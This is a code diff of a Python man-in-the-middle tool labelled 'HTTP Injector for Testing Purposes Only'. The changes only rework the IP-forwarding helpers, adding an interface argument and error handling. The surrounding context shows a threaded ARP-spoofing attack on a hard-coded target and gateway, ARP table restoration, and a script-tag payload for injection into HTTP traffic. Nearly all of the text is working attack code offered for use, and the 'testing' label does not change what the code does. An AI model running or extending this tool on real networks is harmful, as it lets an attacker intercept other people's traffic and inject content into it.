@@ -12,18 +12,26 @@ TARGET_IP = "10.0.1.33"  # Replace with the target machine's IP
 INJECTION_CODE = '<script>alert("Injected Code: For Educational Purposes Only!");</script>'
 
 # Enable IP forwarding for the attacker's machine
-def enable_ip_forwarding():
-    if os.name == "nt":  # Windows
-        subprocess.run(["netsh", "interface", "ipv4", "set", "global", "forwarding=enabled"])
-    else:  # Unix/Linux/Mac
-        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], shell=True)
+def enable_ip_forwarding(interface):
+    try:
+        if os.name == "nt":  # Windows
+            subprocess.run(["netsh", "interface", "ipv4", "set", "interface", interface, "forwarding=enabled"], check=True)
+        else:  # Unix/Linux/Mac
+            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], shell=True, check=True)
+        print("IP forwarding enabled successfully.")
+    except subprocess.CalledProcessError as e:
+        print(f"Failed to enable IP forwarding: {e}")
 
 # Disable IP forwarding
-def disable_ip_forwarding():
-    if os.name == "nt":  # Windows
-        subprocess.run(["netsh", "interface", "ipv4", "set", "global", "forwarding=disabled"])
-    else:  # Unix/Linux/Mac
-        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], shell=True)
+def disable_ip_forwarding(interface):
+    try:
+        if os.name == "nt":  # Windows
+            subprocess.run(["netsh", "interface", "ipv4", "set", "interface", interface, "forwarding=disabled"], check=True)
+        else:  # Unix/Linux/Mac
+            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], shell=True, check=True)
+        print("IP forwarding disabled successfully.")
+    except subprocess.CalledProcessError as e:
+        print(f"Failed to disable IP forwarding: {e}")
 
 # ARP spoofing function
 def arp_spoof(target_ip, spoof_ip):
@@ -61,7 +69,7 @@ def packet_callback(packet):
 
 # Main function
 def main(interface):
-    enable_ip_forwarding()
+    enable_ip_forwarding(interface)
     try:
         arp_thread = threading.Thread(target=arp_spoof, args=(TARGET_IP, GATEWAY_IP))
         arp_thread.start()
@@ -72,11 +80,11 @@ def main(interface):
         print("Restoring ARP table...")
         restore_arp(TARGET_IP, GATEWAY_IP)
     finally:
-        disable_ip_forwarding()
+        disable_ip_forwarding(interface)
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="HTTP Injector for Testing Purposes Only")
-    parser.add_argument("interface", help="The network interface to use (e.g., eth0, wlan0)")
+    parser.add_argument("interface", help="The network interface to use (e.g., eth0, wlan0, WiFi 2)")
     args = parser.parse_args()
 
     main(args.interface)
